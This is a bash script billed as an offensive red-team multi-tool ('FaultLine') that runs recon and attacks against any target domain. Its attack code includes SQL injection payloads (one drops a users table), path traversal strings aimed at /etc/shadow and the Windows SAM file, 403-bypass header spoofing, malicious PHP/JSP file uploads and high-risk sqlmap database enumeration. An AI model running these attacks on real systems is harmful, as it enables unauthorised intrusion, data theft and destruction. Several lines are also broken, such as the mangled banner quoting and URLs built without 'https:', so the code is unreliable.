#!/bin/bash

# ======= COLORS =======
RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"
YELLOW="\033[1;33m"
MAGENTA="\033[1;35m"
WHITE="\033[1;37m"
NC="\033[0m"  # No Color

# ======= VARIABLES =======
SAVE_MODE=0
OUTPUT_DIR=""
DEBUG=0  # Set to 1 to enable debugging

debug() {
    if [[ "$DEBUG" -eq 1 ]]; then
        echo -e "${YELLOW}[DEBUG] $1${NC}"
    fi
}

# ======= BANNER =======
banner() {
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════════════╗";
echo "║                                                                      ║";
echo "║ 8888888888                888 888    888      d8b                    ║";
echo "║ 888                       888 888    888      Y8P                    ║";
echo "║ 888                           888 888    888                         ║";
echo "║ 8888888  8888b.  888  888 888 888888 888      888 88888b.   .d88b.   ║";
echo "║ 888         "88b 888  888 888 888    888      888 888 "88b d8P  Y8b  ║";
echo "║ 888     .d888888 888  888 888 888    888      888 888  888 88888888  ║";
echo "║ 888     888  888 Y88b 888 888 Y88b.  888      888 888  888 Y8b.      ║";
echo "║ 888     "Y888888  "Y88888 888  "Y888 88888888 888 888  888  "Y8888   ║";
echo "║                                                                      ║";
echo "║                                                                      ║";
echo "║                                                                      ║";
echo "║                                                                      ║";
echo "╚══════════════════════════════════════════════════════════════════════╝";${NC}"
    echo -e "${WHITE}FaultLine: Red-Team Pentesting Suite${NC}"
    echo -e "${YELLOW}Offensive Security Multi-Tool${NC}"
    echo -e "${MAGENTA}------------------------------------------------------------"
    echo "    Developer: Austin Tatham | Version: 1.0.0"
    echo -e "------------------------------------------------------------${NC}"
}

# ======= USAGE =======
usage() {
    echo -e "${GREEN}Usage:${NC} $0 -t <target> -m <mode> [-s <output_dir>]"
    echo -e "${YELLOW}Modes:${NC} recon, exploit, all"
    echo -e "${YELLOW}Options:${NC}"
    echo "  -t <target>     Target domain or IP (e.g., example.com)"
    echo "  -m <mode>       Operation mode"
    echo "  -s <output_dir> Enable saving and specify output directory"
    exit 1
}

# ======= SAVE OUTPUT =======
save_output() {
    local data="$1"
    local filename="$2"
    if [[ "$SAVE_MODE" -eq 1 ]]; then
        mkdir -p "$OUTPUT_DIR"
        echo "$data" >> "$OUTPUT_DIR/$filename"
        echo -e "${GREEN}[+] Saved to $OUTPUT_DIR/$filename${NC}"
    fi
}

# Helper to check if a tool is installed
check_tool() {
    local tool="$1"
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${RED}[-] Tool '$tool' not found. Some features may fail.${NC}"
    fi
}

BYPASS_PAYLOADS=(
    "//admin//"
    "/admin?"
    "/admin/.."
    "/admin/%2e/"
    "/admin/%20"
    "/admin/.htaccess"
    "/admin/.json"
    "/admin.json"
    "/admin/;%2f..%2f..%2f"
    "/admin?id=1"
    "/admin~"
    "/admin/~"
    "/admin/..%3B/"
    "/admin/%3f/"
    "/admin/%09/"
    "/admin/%0a/"
    "/admin/%0d/"
)

BYPASS_HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "Referer: https://www.google.com"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Host: localhost"
    "Forwarded: 127.0.0.1"
)

SQLI_PAYLOADS=(
    "' OR 1=1 --"
    "' OR '1'='1' --"
    "' UNION SELECT NULL, NULL, NULL --"
    "' OR SLEEP(5) --"
    "' UNION SELECT username, password FROM users --"
    "' OR 1=1#"
    "' UNION SELECT @@version, user() --"
    "'; DROP TABLE users; --"
    "' OR 1=1/*"
    "admin' OR '1'='1"
    "admin' OR '1'='1'--"
    "admin') OR ('1'='1"
    "admin') OR '1'='1"
    "admin\" OR \"1\"=\"1"
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
)

crawl_html() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Crawling HTML for sensitive data: $url${NC}"
    local html_content=$(curl -s "$url")
    save_output "$html_content" "full_html.txt"

    echo -e "${CYAN}[+] Extracting Comments...${NC}"
    echo "$html_content" | grep '<!--' | save_output "$(cat)" "comments.txt"

    echo -e "${CYAN}[+] Extracting Forms...${NC}"
    echo "$html_content" | grep -oP '<form.*?</form>' | save_output "$(cat)" "forms.txt"

    echo -e "${CYAN}[+] Searching for Hidden Inputs...${NC}"
    echo "$html_content" | grep -oP '<input type="hidden".*?>' | save_output "$(cat)" "hidden_inputs.txt"

    echo -e "${CYAN}[+] Extracting Metadata Tags...${NC}"
    echo "$html_content" | grep -oP '<meta.*?>' | save_output "$(cat)" "meta_tags.txt"

    echo -e "${CYAN}[+] Extracting JavaScript Files...${NC}"
    echo "$html_content" | grep -oP 'src=".*?\.js"' | cut -d'"' -f2 | save_output "$(cat)" "js_files.txt"

    echo -e "${CYAN}[+] Extracting Links...${NC}"
    echo "$html_content" | grep -Eo '(http|https)://[a-zA-Z0-9./?=_-]*' | sort -u | save_output "$(cat)" "urls.txt"

    echo -e "${GREEN}[+] HTML Crawler Complete.${NC}"
}

subdomain_enum() {
    echo -e "${CYAN}[+] Enumerating Subdomains (subfinder + assetfinder + crt.sh)...${NC}"
    local subs=""
    subs+=$(subfinder -d "$TARGET" -silent 2>/dev/null)
    subs+=$'\n'$(assetfinder --subs-only "$TARGET" 2>/dev/null)
    subs+=$'\n'$(curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u)
    echo "$subs" | sort -u | save_output "$(cat)" "subdomains.txt"
}

detect_cms() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Detecting CMS...${NC}"
    local response=$(curl -s "$url")
    if echo "$response" | grep -iq "wp-content"; then
        echo -e "${GREEN}[+] WordPress detected.${NC}"
    elif echo "$response" | grep -iq "drupal"; then
        echo -e "${GREEN}[+] Drupal detected.${NC}"
    elif echo "$response" | grep -iq "joomla"; then
        echo -e "${GREEN}[+] Joomla detected.${NC}"
    else
        echo -e "${YELLOW}[-] No CMS detected.${NC}"
    fi
}

bypass_403() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Attempting 403 bypass on: $url${NC}"
    for path in "${BYPASS_PAYLOADS[@]}"; do
        for header in "${BYPASS_HEADERS[@]}"; do
            local response_code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$url$path")
            if [[ "$response_code" == "200" ]]; then
                echo -e "${GREEN}[+] Bypass Successful: $url$path using Header: $header${NC}"
                save_output "$url$path, Bypass, $header" "bypass_success.txt"
            fi
        done
    done
}

grab_screenshot() {
    echo -e "${CYAN}[+] Taking Screenshots with GoWitness...${NC}"
    if [[ "$SAVE_MODE" -eq 1 ]]; then
        gowitness single "${PROTOCOL}//$TARGET" --destination "$OUTPUT_DIR" 2>/dev/null
    else
        gowitness single "${PROTOCOL}//$TARGET" 2>/dev/null
    fi
}

Port_Scanning() {
    echo -e "${RED}[+] IMPORTANT!${NC}"
    echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET... (5-10 min to complete)${NC}"
    echo -e "${CYAN}[*] Scanning ports...${NC}"
    local nmap_results=$(sudo nmapAutomator.sh -H "$TARGET" -t Full 2>/dev/null || echo "Nmap failed")
    echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
    save_output "$nmap_results" "nmap_$TARGET.txt"
}

misconfigurations_fuzz() {
    echo -e "${CYAN}[+] Checking for Open or Misconfigured Services (FTP/SMB/NFS)...${NC}"
    nmap --script ftp-anon,ftp-bounce,smb-enum-shares,smb-enum-users,nfs-showmount -p 21,139,445,2049 "$TARGET" -oN - | save_output "$(cat)" "service_scripts.txt"
}

FinalRecon_call() {
    echo -e "${CYAN}[*] Running FinalRecon...${NC}"
    # Assume a default wordlist if custom not provided; replace with env var or param if needed
    local wordlist="${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}"
    local finalrecon_results=$(finalrecon --url "${PROTOCOL}//$TARGET" --dir -w "$wordlist" 2>/dev/null)
    echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
    save_output "$finalrecon_results" "finalrecon_$TARGET.txt"
}

parse_js_files() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
    local html=$(curl -s "$url")
    local js_files=$(echo "$html" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2)
    for js in $js_files; do
        curl -s "${js#http}" | grep -Eo 'http(s)?://[^"]+' | save_output "$(cat)" "api_endpoints.txt"
    done
}

test_file_upload() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Testing for File Upload Vulnerabilities on: $url${NC}"
    PAYLOAD_FILES=(
        "test.php"
        "test.jsp"
        "test.html"
        "test.jpg.php"
        "test.php5"
        "test.php;.jpg"
        "test.asp"
        "test.exe"
    )

    # Create Malicious Files
    echo "<?php echo 'Vulnerable'; ?>" > "test.php"
    echo "<% out.println('Vulnerable'); %>" > "test.jsp"
    echo "<script>alert('XSS');</script>" > "test.html"
    echo "MZ" > "test.exe"  # Fake EXE file

    UPLOAD_ENDPOINTS=(
        "/upload"
        "/file-upload"
        "/api/upload"
        "/admin/upload"
        "/media/upload"
        "/files/upload"
    )

    UPLOAD_BYPASS_HEADERS=(
        "Content-Type: application/x-php"
        "Content-Disposition: attachment; filename=\"test.php\""
        "X-File-Name: test.php"
    )

    SUCCESSFUL_UPLOADS=()
    echo -e "${CYAN}[+] Scanning for vulnerable upload endpoints...${NC}"
    for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
        full_endpoint="$url$endpoint"
        for file in "${PAYLOAD_FILES[@]}"; do
            for header in "${UPLOAD_BYPASS_HEADERS[@]}"; do
                response=$(curl -s -X POST -H "$header" -F "file=@$file" "$full_endpoint")
                if echo "$response" | grep -iq -e "success" -e "uploaded" -e "http"; then
                    if [[ ! " ${SUCCESSFUL_UPLOADS[*]} " =~ " $full_endpoint " ]]; then
                        echo -e "${RED}[!] File upload vulnerability found at $full_endpoint${NC}"
                        SUCCESSFUL_UPLOADS+=("$full_endpoint")
                    fi
                    EXEC_PATHS=("$full_endpoint/$file" "$url/uploads/$file" "$url/media/$file")
                    for exec_path in "${EXEC_PATHS[@]}"; do
                        exec_response=$(curl -s "$exec_path")
                        if echo "$exec_response" | grep -iq "Vulnerable"; then
                            echo -e "${GREEN}[+] Executable file uploaded successfully: $exec_path${NC}"
                        fi
                    done
                fi
            done
        done
    done
    echo -e "${GREEN}[+] File Upload Testing Complete.${NC}"
    rm -f "${PAYLOAD_FILES[@]}"  # Clean up
}

dns_brute() {
    echo -e "${CYAN}[+] Brute-forcing DNS...${NC}"
    local wordlist="${DNS_WORDLIST:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt}"
    dnsrecon -d "$TARGET" -D "$wordlist" -t brt 2>/dev/null | save_output "$(cat)" "dns_brute.txt"
}

fuzz_suite() {
    echo -e "${CYAN}[+] Launching Full-Stack Fuzzing Suite...${NC}"

    echo -e "${CYAN}[+] Fuzzing GET parameters for injection points...${NC}"
    local param_wordlist="${PARAM_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt}"
    ffuf -u "${PROTOCOL}//$TARGET?FUZZ=test" -w "$param_wordlist" -t 40 -mc all -of json -o - 2>/dev/null | save_output "$(cat)" "ffuf_params.json"

    echo -e "${CYAN}[+] Running dirsearch...${NC}"
    local dir_wordlist="${DIR_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
    dirsearch -u "${PROTOCOL}//$TARGET" -e php,html,js,txt -w "$dir_wordlist" -o - 2>/dev/null | save_output "$(cat)" "dirsearch.txt"

    echo -e "${CYAN}[+] Scanning for vulnerable network services...${NC}"
    nmap -p 161,500,1900,5353,111,2049 "$TARGET" -sV -oN - 2>/dev/null | save_output "$(cat)" "net_services.txt"
}

sql_injection_test() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $url${NC}"
    PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
    for payload in "${PAYLOADS[@]}"; do
        response=$(curl -s "$url?id=$payload")
        if [[ $response =~ "error" || $response =~ "syntax" ]]; then
            echo -e "${GREEN}[!] SQL Injection vulnerability detected: $payload${NC}"
        fi
    done
}

test_directory_traversal() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Testing for Advanced Directory Traversal Vulnerabilities on: $url${NC}"
    local output_file="$OUTPUT_DIR/traversal_vulns.txt" if [[ $SAVE_MODE -eq 1 ]]; then touch "$output_file"; fi

    PAYLOADS=(
        "../../../../etc/passwd"
        "../../../../etc/shadow"
        "../../../../etc/group"
        "../../../../etc/hosts"
        "../../../../etc/apache2/apache2.conf"
        "../../../../etc/nginx/nginx.conf"
        "../../../../etc/mysql/my.cnf"
        "../../../../proc/self/environ"
        "../../../../windows/win.ini"
        "../../../../windows/system32/drivers/etc/hosts"
        "../../../../windows/system32/config/sam"
        "../../../../windows/system32/config/system"
        "../../../../windows/system32/config/regback/system"
        "../../../../../../../../../../etc/passwd"
        ".././.././.././.././.././.././../etc/passwd"
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini"
        "../../../../../../../../../../../../../../../../etc/passwd"
        "../../../../../../../../../../../../../../../../windows/system32/config/sam"
        "../../../../etc/passwd%00"
        "../../../../etc/shadow%00"
        "../../../../../../../../../../etc/passwd%00"
        "../../../../../../../../../../windows/system32/config/sam%00"
        "../../../../etc/passwd%2500"
        "../../../../etc/shadow%2500"
        "../..%2f../..%2f../..%2f../..%2f../..%2f../..%2fetc/passwd"
        "../../../../../..%252f..%252f..%252f..%252fetc/passwd"
        "../../../../../..%c0%afetc/passwd"
    )

    REQUEST_METHODS=("GET" "POST" "HEAD")
    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Mozilla/5.0 (Linux; Android 10)"
    )

    HEADERS=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "Referer: https://www.google.com"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Host: localhost"
        "Forwarded: 127.0.0.1"
    )

    SUCCESSFUL_TRAVERSAL=()
    echo -e "${CYAN}[+] Scanning for directory traversal vulnerabilities...${NC}"
    for method in "${REQUEST_METHODS[@]}"; do
        for user_agent in "${USER_AGENTS[@]}"; do
            for header in "${HEADERS[@]}"; do
                for payload in "${PAYLOADS[@]}"; do
                    response=$(curl -s -X "$method" -H "User-Agent: $user_agent" -H "$header" "$url/$payload")
                    if echo "$response" | grep -iq -e "root:x" -e "127.0.0.1" -e "windows registry" -e "root:x:0" -e "[boot loader]" -e "mysql_user" -e "apache2.conf" -e "nginx.conf"; then
                        if [[ ! " ${SUCCESSFUL_TRAVERSAL[*]} " =~ " $url/$payload " ]]; then
                            echo -e "${RED}[!] Directory Traversal Vulnerability Found at: $url/$payload${NC}"
                            SUCCESSFUL_TRAVERSAL+=("$url/$payload")
                            if [[ $SAVE_MODE -eq 1 ]]; then echo "$url, Traversal, $payload" >> "$output_file"; fi
                        fi
                    fi
                done
            done
        done
    done
    echo -e "${GREEN}[+] Directory Traversal Testing Complete.${NC}"
    if [[ $SAVE_MODE -eq 1 ]]; then echo -e "${GREEN}Results saved in $output_file${NC}"; fi
}

test_sqli() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Testing SQL Injection on $url${NC}"
    for payload in "${SQLI_PAYLOADS[@]}"; do
        response=$(curl -s "$url/login?user=$payload")
        if echo "$response" | grep -iq -e "error" -e "admin"; then
            echo -e "${GREEN}[!] SQLi Found: $url/login?user=$payload${NC}"
            save_output "$url, SQLi, $payload" "sqli_vulns.txt"
        fi
    done
}

temp_sqlmap() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Starting SQL Injection Recon on $url${NC}"

    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    SQLMAP_BASE="$OUTPUT_DIR/sqlmap_$TIMESTAMP" if [[ $SAVE_MODE -eq 1 ]]; then mkdir -p "$SQLMAP_BASE"; fi
    LOGFILE="$SQLMAP_BASE/full_report.log" if [[ $SAVE_MODE -eq 1 ]]; then touch "$LOGFILE"; fi

    echo -e "${CYAN}[*] Phase 1: Fingerprinting & Crawling${NC}" | tee -a "$LOGFILE"
    sqlmap -u "$url" --batch --level=5 --risk=3 --crawl=3 --random-agent --technique=BEUSTQ \
        --threads=4 --delay=1 --timeout=15 --retries=2 \
        --flush-session --answers="follow=Y" --smart \
        --fingerprint | tee -a "$LOGFILE"

    echo -e "${CYAN}[*] Phase 2: Parameter Discovery & Testing${NC}" | tee -a "$LOGFILE"
    sqlmap -u "$url" --batch --level=5 --risk=3 --random-agent --technique=BEUSTQ \
        --forms --crawl=3 --crawl-exclude="logout" \
        --threads=5 --delay=1 \
        --flush-session \
        --identify-waf | tee -a "$LOGFILE"

    echo -e "${CYAN}[*] Phase 3: Database Enumeration${NC}" | tee -a "$LOGFILE"
    sqlmap -u "$url" --batch --random-agent --technique=BEUSTQ \
        --threads=3 --delay=1 \
        --dbs | tee -a "$LOGFILE"

    # For phases 4-5, in practice you'd parse DBs from logs; here skip or manual
    echo -e "${YELLOW}[-] Phases 4-5 skipped: Manually specify DB/table from logs.${NC}" | tee -a "$LOGFILE"

    echo -e "${GREEN}[+] SQLmap Testing Completed!${NC}"
    if [[ $SAVE_MODE -eq 1 ]]; then echo -e "${GREEN}Logs saved in $SQLMAP_BASE${NC}"; fi
}

detect_waf() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Detecting WAF...${NC}"
    local payload="' AND 1=1 --"
    local response_code=$(curl -s -d "param=$payload" "$url" -o /dev/null -w "%{http_code}")
    if [[ $response_code == "403" || $response_code == "406" ]]; then
        echo -e "${RED}[!] WAF detected: Response code $response_code.${NC}"
    else
        echo -e "${GREEN}[+] No WAF detected.${NC}"
    fi
}

test_http_methods() {
    local url="${PROTOCOL}//$TARGET"
    echo -e "${CYAN}[+] Testing HTTP Methods...${NC}"
    methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE")
    for method in "${methods[@]}"; do
        response_code=$(curl -s -X "$method" "$url" -w "%{http_code}" -o /dev/null)
        echo -e "${YELLOW}[*] $method returned status code: $response_code${NC}"
        if [[ $method == "TRACE" && $response_code == "200" ]]; then
            echo -e "${RED}[!] TRACE method enabled. Possible XST vulnerability!${NC}"
        fi
    done
}

main() {
    banner

    case "$MODE" in
        recon)
            crawl_html
            detect_cms
            subdomain_enum
            parse_js_files
            grab_screenshot
            fuzz_suite
            misconfigurations_fuzz
            Port_Scanning
            detect_waf
            FinalRecon_call
            ;;
        exploit)
            Port_Scanning
            parse_js_files
            test_http_methods
            subdomain_enum
            grab_screenshot
            dns_brute
            fuzz_suite
            detect_waf
            misconfigurations_fuzz
            test_file_upload
            test_directory_traversal
            bypass_403
            sql_injection_test
            ;;
        all)
            crawl_html
            detect_cms
            parse_js_files
            dns_brute
            subdomain_enum
            test_http_methods
            grab_screenshot
            detect_waf
            fuzz_suite
            misconfigurations_fuzz
            FinalRecon_call
            test_file_upload
            test_directory_traversal
            bypass_403
            Port_Scanning
            sql_injection_test
            temp_sqlmap
            ;;
        *)
            usage
            ;;
    esac
    echo -e "${GREEN}[+] FaultLine execution completed.${NC}"
}

# Enable error handling
set -euo pipefail

# Check dependencies
check_tool "curl"
check_tool "grep"
check_tool "subfinder"
check_tool "assetfinder"
check_tool "jq"
check_tool "gowitness"
check_tool "nmap"
check_tool "dnsrecon"
check_tool "ffuf"
check_tool "dirsearch"
check_tool "sqlmap"
# Add more as needed

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t) TARGET="$2"; shift ;;
        -m) MODE="$2"; shift ;;
        #-jwt) JWT_TOKEN="$2"; shift ;;  # Unused, commented
        -s) SAVE_MODE=1; OUTPUT_DIR="$2"; shift ;;
        *) usage ;;
    esac
    shift
done

# Validate required args
if [[ -z "${TARGET:-}" || -z "${MODE:-}" ]]; then
    usage
fi

# Default to HTTPS, but check if HTTP
PROTOCOL="https"
if ! curl -s -I "https://$TARGET" &> /dev/null; then
    PROTOCOL="http"
    echo -e "${YELLOW}[-] Falling back to HTTP for $TARGET.${NC}"
fi

if [[ "$SAVE_MODE" -eq 1 && -z "$OUTPUT_DIR" ]]; then
    OUTPUT_DIR="./output_$(date +%Y%m%d_%H%M%S)"
    echo -e "${YELLOW}[+] Output directory not specified; using $OUTPUT_DIR${NC}"
fi
mkdir -p "$OUTPUT_DIR" || true

main
